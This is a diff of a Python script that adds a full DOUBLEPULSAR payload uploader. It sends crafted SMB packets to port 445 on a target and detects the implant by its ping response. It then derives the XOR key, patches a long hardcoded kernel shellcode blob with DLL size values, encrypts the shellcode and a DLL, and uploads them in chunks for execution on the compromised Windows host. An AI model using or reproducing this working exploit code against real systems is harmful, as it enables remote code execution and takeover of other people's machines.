@@ -9,6 +9,7 @@ def calculate_doublepulsar_xor_key(s):
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
     return x
 
+
 # The arch is adjacent to the XOR key in the SMB signature
 def calculate_doublepulsar_arch(s):
     if s & 0xffffffff00000000 == 0:
@@ -47,8 +48,9 @@ def hexdump(src, length=16, sep='.'):
         printable = ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
         lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
     return lines
-  
-#https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
+
+
+# https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
 def le2int(buf):
     """little endian buffer to integer."""
     integer = 0
@@ -57,6 +59,7 @@ def le2int(buf):
         integer |= ord(byte) << shift
         shift += 8
     return integer
+
 
 def int2le(integer, pad):
     """integer to little endian buffer."""
@@ -71,7 +74,12 @@ def int2le(integer, pad):
     if not buf:
         return '\x00'
     return ''.join(buf)
-  
+
+def byte_xor(data, key):
+    for i in range(len(data)):
+        data[i] ^= key[i % len(key)]
+    return
+
 rundll_kernel_shellcode = b"\x48\x89\xE0\x66\x83\xE4\xF0\x41\x57\x41\x56\x41\x55\x41\x54\x53"
 rundll_kernel_shellcode += b"\x51\x52\x55\x57\x56\x50\x50\xE8\xBC\x06\x00\x00\x48\x89\xC3\x48\xB9\xDF\x81\x14\x3E\x00\x00\x00\x00\xE8\x26"
 rundll_kernel_shellcode += b"\x05\x00\x00\x48\x85\xC0\x0F\x84\x55\x03\x00\x00\x48\x89\x05\x9C\x07\x00\x00\x48\xB9\xBA\x1E\x03\xA0\x00\x00"
@@ -302,13 +310,240 @@ rundll_kernel_shellcode += b"\x29\xD9\x48\x89\xDF\xF3\xAA\x48\x8D\x0D\x0D\x00\x0
 rundll_kernel_shellcode += b"\xF3\xAA\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5E\x5F\x5D\x5B\xC3\xEB\x08\x00\x14\x00\x00\x01\x00\x00\x00"
 
 if __name__ == "__main__":
-  read_dll_file_as_hex()
-  
-  #patch RunDLL bootstrap kernel shellcode with the required values
-  
-  #loop through buffer
-  
-  #generate packet here
-  #patch values
-  #send
-  
+    # Packets
+    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+    session_setup_request = binascii.unhexlify( "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+
+    timeout = 5.0
+    # sample IP
+    ip = "192.168.0.13"
+
+    # Connect to socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(float(timeout) if timeout else None)
+    host = ip
+    port = 445
+    s.connect((host, port))
+
+    # Send/receive negotiate protocol request
+    print("Sending negotiation protocol request")
+    s.send(negotiate_protocol_request)
+    s.recv(1024)
+
+    # Send/receive session setup request
+    print("Sending session setup request")
+    s.send(session_setup_request)
+    session_setup_response = s.recv(1024)
+
+    # Extract user ID from session setup response
+    user_id = session_setup_response[32:34]
+    print("User ID = %s" % struct.unpack("<H", user_id)[0])
+
+    # Replace user ID in tree connect request packet
+    modified_tree_connect_request = bytearray(tree_connect_request)
+    modified_tree_connect_request[32] = user_id[0]
+    modified_tree_connect_request[33] = user_id[1]
+
+    # Send tree connect request
+    print("Sending tree connect")
+    s.send(modified_tree_connect_request)
+    tree_connect_response = s.recv(1024)
+
+    # Extract tree ID from response
+    tree_id = tree_connect_response[28:30]
+    print("Tree ID = %s" % struct.unpack("<H", tree_id)[0])
+
+    # Replace tree ID and user ID in trans2 session setup packet
+    modified_trans2_session_setup = bytearray(trans2_session_setup)
+    modified_trans2_session_setup[28] = tree_id[0]
+    modified_trans2_session_setup[29] = tree_id[1]
+    modified_trans2_session_setup[32] = user_id[0]
+    modified_trans2_session_setup[33] = user_id[1]
+
+    # Send trans2 sessions setup request
+    print("Sending trans2 session setup - ping command")
+    s.send(modified_trans2_session_setup)
+    final_response = s.recv(1024)
+
+    # Check for 0x51 response to indicate DOUBLEPULSAR infection
+    if final_response[34] == 81:
+        signature = final_response[18:22]
+        signature_long = struct.unpack('<I', signature)[0]
+        key = calculate_doublepulsar_xor_key(signature_long)
+        arch = calculate_doublepulsar_arch(signature_long)
+        print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
+
+        int_bytes_xor_key = int(key)
+        bytes_xor_key = int2le(int_bytes_xor_key, 0)
+        b_bytes_xor_key = bytes(bytes_xor_key.encode())
+
+        hex_bytes = read_dll_file_as_hex()
+        total_size_little_endian = struct.pack('<I', len(hex_bytes))
+        print(hexdump(total_size_little_endian))
+        print('File size: {:d}'.format(len(hex_bytes)))
+
+        bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
+        bytearray_hex_bytes = bytearray(hex_bytes)
+
+        EntireDLLSize = len(hex_bytes)
+
+        EntirePayloadSize = len(hex_bytes) + 6144
+        #debug purposes:  EntirePayloadSize = 0x50D800FF
+        #EntirePayloadSize = 6144 + len(hex_bytes)
+
+        offset_kernel_shellcode = 2158
+        offset_dll_size = 6136
+        offset_dll_ordinal = 6140
+
+        total_size_of_dll_and_user_shellcode = struct.pack('<I', EntireDLLSize + 3978)
+        total_size_dll = struct.pack('<I', EntireDLLSize)
+        ordinal = 1
+        dll_ordinal = struct.pack('<I', ordinal)
+        bytearray_rundll_kernel_shellcode[offset_kernel_shellcode: offset_kernel_shellcode + 4] = total_size_of_dll_and_user_shellcode
+        bytearray_rundll_kernel_shellcode[offset_dll_size: offset_dll_size + 4] = total_size_dll
+        bytearray_rundll_kernel_shellcode[offset_dll_ordinal: offset_dll_ordinal + 4] = dll_ordinal
+        #print(hexdump(bytearray_rundll_kernel_shellcode))
+
+        EncryptedPayload = bytearray_rundll_kernel_shellcode
+        EncryptedPayload += bytearray_hex_bytes
+        byte_xor(EncryptedPayload, b_bytes_xor_key)
+
+        total_payload_size = len(EncryptedPayload)
+        iterations = total_payload_size / 4096
+        remainder = total_payload_size % 4096
+        print("we will send %d full 4096 byte packets" % iterations)
+
+        trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+        doublepulsar_exec_packet = bytearray(trans2_exec_packet)
+
+        global CTX
+        CTX = 0
+        global Offset
+        Offset = 0
+        global BytesLeft
+        BytesLeft = total_payload_size
+        if remainder > 0:
+            print("we have a remainder of:  %d bytes" % remainder)
+
+        times = int(iterations)
+        for i in range(times):
+            print("[%d] sending a packet!" % i)
+            payload_chunk = EncryptedPayload[Offset:4096]
+            #some_bytes = b''.join([hex_bytes[Offset: Offset + 4096] for i in range(0, len(hex_bytes), 4096)])
+
+            chunk = b''.join([EncryptedPayload[Offset: Offset + 4096]])
+            parameters = b''
+            '''
+            since our payload is less than 4096, we can send the packet in one packet.
+            it is possible for the EntireSize to be 5 MB in bytes
+            it is not possible for the chunksize to be more than 4096
+            if this is a large payload, you must increment the offset by the last chunk size
+            '''
+            EntireSize = struct.pack('<I', EntirePayloadSize)  # entire value of the payload being uploaded
+            ChunkSize = struct.pack('<I', 4096)  # using the same value since chunk size is less than 4096
+            offset = struct.pack('<I', Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+
+            parameters += EntireSize
+            parameters += ChunkSize
+            parameters += offset
+
+            parameters_bytearray = bytearray(parameters)
+            byte_xor(parameters_bytearray, b_bytes_xor_key)
+
+            doublepulsar_exec_packet += parameters_bytearray
+            doublepulsar_exec_packet += chunk
+
+            # update values for tree ID and user ID
+            doublepulsar_exec_packet[28] = tree_id[0]
+            doublepulsar_exec_packet[29] = tree_id[1]
+            doublepulsar_exec_packet[32] = user_id[0]
+            doublepulsar_exec_packet[33] = user_id[1]
+
+            s.send(doublepulsar_exec_packet)
+            smb_response = s.recv(1024)
+
+            Offset += 4096
+            BytesLeft -= 4096
+            CTX += 4096
+
+        if remainder > 0:
+            print("LAST PACKET!")
+            last_trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+            last_doublepulsar_exec_packet = bytearray(last_trans2_exec_packet)
+
+            remainder_packet_len = 70 + remainder + 12 - 4
+            print("UPDATED:  Total size of SMB packet & shellcode:  %d" % remainder_packet_len)
+
+            print("Updating SMB length value...")
+            # SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+            # If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
+            smb_length = struct.pack('>H', remainder_packet_len)
+
+            last_doublepulsar_exec_packet[2] = smb_length[0]
+            last_doublepulsar_exec_packet[3] = smb_length[1]
+
+            # <I = Little Endian unsigned integer
+            TotalDataCount = struct.pack('<I', remainder)
+            DataCount = struct.pack('<I', remainder)
+            ByteCount = struct.pack('<I', remainder + 13)
+
+            # last_payload_chunk = hex_bytes[Offset:remainder]
+            # print(hexdump(last_payload_chunk))
+            remainder_bytes = b''.join([EncryptedPayload[Offset: Offset + remainder]])  # for i in range(0, len(hex_bytes), remainder)])
+            print("Length of last remainder bytes:  %d" % len(remainder_bytes))
+
+            # remainder_bytes[i * 4096: (i + 1) * 4096] = file.read(4096)
+
+            last_parameters = b''
+            LastEntireSize = struct.pack('<I', EntirePayloadSize)  # entire value of the payload being uploaded
+            LastChunkSize = struct.pack('<I', remainder)  # using the same value since chunk size is less than 4096
+            LastOffset = struct.pack('<I', Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+            last_parameters += LastEntireSize
+            last_parameters += LastChunkSize
+            last_parameters += LastOffset
+            last_parameters_bytearray = bytearray(last_parameters)
+            byte_xor(last_parameters_bytearray, b_bytes_xor_key)
+
+            last_doublepulsar_exec_packet[39] = TotalDataCount[0]
+            last_doublepulsar_exec_packet[40] = TotalDataCount[1]
+            # update DataCount in the packet ( default in the packet is 4096 )
+            last_doublepulsar_exec_packet[59] = DataCount[0]
+            last_doublepulsar_exec_packet[60] = DataCount[1]
+            # update ByteCount in the packet ( default in the packet is 4109 )
+            last_doublepulsar_exec_packet[67] = ByteCount[0]
+            last_doublepulsar_exec_packet[68] = ByteCount[1]
+
+            # update values for tree ID and user ID
+            last_doublepulsar_exec_packet[28] = tree_id[0]
+            last_doublepulsar_exec_packet[29] = tree_id[1]
+            last_doublepulsar_exec_packet[32] = user_id[0]
+            last_doublepulsar_exec_packet[33] = user_id[1]
+
+            last_doublepulsar_exec_packet += last_parameters_bytearray
+            last_doublepulsar_exec_packet += remainder_bytes
+
+            s.send(last_doublepulsar_exec_packet)
+            smb_response = s.recv(1024)
+
+            BytesLeft -= remainder
+            print("Bytes left -> %d", BytesLeft)
+
+        tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
+        tree_disconnect_packet = bytearray(tree_disconnect)
+        tree_disconnect_packet[28] = tree_id[0]
+        tree_disconnect_packet[29] = tree_id[1]
+        tree_disconnect_packet[32] = user_id[0]
+        tree_disconnect_packet[33] = user_id[1]
+        s.send(tree_disconnect_packet)
+        smb_response = s.recv(1024)
+
+        logoff = binascii.unhexlify("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
+        logoff_packet = bytearray(logoff)
+        logoff_packet[28] = tree_id[0]
+        logoff_packet[29] = tree_id[1]
+        logoff_packet[32] = user_id[0]
+        logoff_packet[33] = user_id[1]
+        s.send(logoff_packet)
+        smb_response = s.recv(1024)
